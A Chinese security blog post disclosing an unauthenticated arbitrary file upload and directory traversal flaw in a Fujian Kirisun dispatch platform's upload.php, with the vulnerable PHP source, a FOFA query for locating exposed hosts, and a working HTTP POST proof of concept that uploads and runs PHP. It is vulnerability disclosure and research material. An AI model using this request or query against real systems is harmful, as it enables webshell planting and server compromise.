---
title: "福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/custom-zx-upload-rce.html
asset_dir: assets/福建科立讯通信指挥调度管理平台-customzxupload.php-任意文件上传漏洞
---

# 福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/20 18:23
* 1122浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

系统平台

api

平台


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。福建科立讯通信有限公司指挥调度管理平台 custom/zx/upload.php 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份认证的攻击者可通给该漏洞写入如webshell等后门文件，导致服务器失陷。

无线电设备

# 影响版本

# fofa语法

> `body="指挥调度管理平台"`

# 漏洞分析

custom/zx/upload.php 文件很简单，业务逻辑实现如下

```
<?php

        $types=array('txt','png','pdf','jpeg','amr','wav','mp4','avi','mp3','3gp');
        $types1=explode('/', $_FILES['ulfile']['type']);
        if(!in_array($types1[1], $types)){
                echo json_encode(array("code"=>1,"msg"=>"upload file type error"));
                exit();
        }
        if (is_uploaded_file($_FILES['ulfile']['tmp_name'])) {
                move_uploaded_file($_FILES['ulfile']['tmp_name'], $_SERVER['DOCUMENT_ROOT'].'/upload/'.$_FILES['ulfile']['name']);
        }
?>
```

深入探索

安全认证考试

SQL注入防护

Web安全课程

虽然有判断文件类型，但是使用的是文件的 MIME 类型来和预置的类型比较，`$_FILES['ulfile']['type']` 是文件的 MIME 类型，而文件的 MIME 类型 可以通过上传时的file 部分的 `Content-Type: image/png` 来控制从而绕过类型判断，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

其次是上传文件的保存路径直接拼接文件名作为最终的文件保存路径

编程

```
move_uploaded_file($_FILES['ulfile']['tmp_name'], $_SERVER['DOCUMENT_ROOT'].'/upload/'.$_FILES['ulfile']['name']);
```

因此还存在文件目录穿越漏洞，可以通过控制文件名如 `../x.php`来穿越到网站根目录。

# 漏洞复现

## POC

```
POST /custom/zx/upload.php HTTP/1.1
Host: test.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456

------WebKitFormBoundary123456
Content-Disposition: form-data; name="ulfile"; filename="test.php"
Content-Type: image/png

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary123456--
```

[![福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞](images/img-001-4dfa48b962a3.webp)](https://image.mrxn.net/46c7023d35f947ec937994c6e56f8e31.webp)

访问文件 /upload/test.php

漏洞预警服务

[![福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞](images/img-002-f6e0e247844c.webp)](https://image.mrxn.net/87089ec56bb3474f8490a1c525ab9682.webp)

成功执行我们的代码

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞](https://mrxn.net/jswz/custom-zx-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/custom-zx-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/custom-zx-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读

计算机服务器


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
